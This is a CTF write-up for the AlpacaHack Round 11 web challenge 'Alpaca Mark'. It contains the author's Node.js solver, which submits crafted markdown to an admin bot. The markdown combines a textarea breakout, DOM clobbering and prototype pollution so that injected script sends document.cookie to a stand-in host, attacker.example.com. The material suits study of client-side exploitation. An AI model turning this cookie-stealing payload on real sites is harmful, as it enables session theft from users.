---
title: "Alpaca Mark - AlpacaHack Round 11 2025"
category: "web"
subcategory: "prototype-pollution"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "prototype-pollution", "alpaca", "mark", "web", "alpacahack-round-11"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202505_AlpacaHack_Round_11/web/alpaca-mark"
license: "none stated"
ctf:
  name: "AlpacaHack Round 11"
  year: 2025
  challenge: "Alpaca Mark"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202505_AlpacaHack_Round_11/web/alpaca-mark>
- **CTF:** AlpacaHack Round 11 2025

---

# [web] AlpacaMark

## Description

`:alpaca:` -> 🦙

## Attachments

- [alpaca-mark](distfiles)

## Usage

Launch a challenge server:

```
cd challenge
docker compose up
```

Run the author's solver:

```
docker run -it --rm \
    -e BOT_BASE_URL=http://localhost:1337 \
    -e CONNECTBACK_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solution)
```
where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202505_AlpacaHack_Round_11/web/alpaca-mark/solution/index.js>

```javascript
import fastify from "fastify";
import assert from "node:assert/strict";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? assert.fail("No URL");
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

app.get("/*", async (req, reply) => {
  // You got a flag!
  console.log(decodeURIComponent(req.url));
  process.exit(0);
});

const markdown = `
</textarea>
<iframe name=currentScript src="/?__proto__[tagName]=SCRIPT&__proto__[src]=data:,location='${CONNECTBACK_URL}/'%2bdocument.cookie//" credentialless></iframe>
<link rel=stylesheet href=/0>
<link rel=stylesheet href=/1>
<link rel=stylesheet href=/2>
<link rel=stylesheet href=/3>
<link rel=stylesheet href=/4>
<link rel=stylesheet href=/5>
<link rel=stylesheet href=/6>
<textarea>
`.trim();

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) assert.fail(err.toString());

  await sleep(3_000);
  await reportUrl(
    `http://alpaca-mark:3000?${new URLSearchParams({ markdown })}`
  );

  await sleep(3_000);
  assert.fail("Failed");
});
```
